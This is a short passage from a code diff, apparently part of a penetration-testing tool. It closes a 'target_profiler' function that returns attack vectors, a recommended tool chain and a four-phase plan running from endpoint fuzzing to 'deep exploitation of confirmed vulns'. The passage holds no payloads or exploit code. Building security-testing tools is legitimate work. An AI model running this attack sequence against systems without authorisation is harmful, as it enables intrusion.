+        "status": "success",
+        "target": target,
+        "profile": profile,
+        "attack_vectors": attack_vectors,
+        "recommended_tool_chain": list(dict.fromkeys(recommended_tools)),
+        "execution_order": [
+            "Phase 1: context_fuzzer (discover endpoints)",
+            "Phase 2: smart_vulnerability_detector (critical vulns)",
+            "Phase 3: Stack-specific injection testing",
+            "Phase 4: Deep exploitation of confirmed vulns",
+        ],
+    }
+    
+    progress.update("Complete")
+    output = chain_engine.enrich_with_context("target_profiler", target, output)
+    log_tool_execution("target_profiler", target, inputs, output, trace, progress)
+    return json.dumps(output, indent=2)
+
+
+
 # ============================================================================
 # MAIN ENTRY POINT
 # ============================================================================
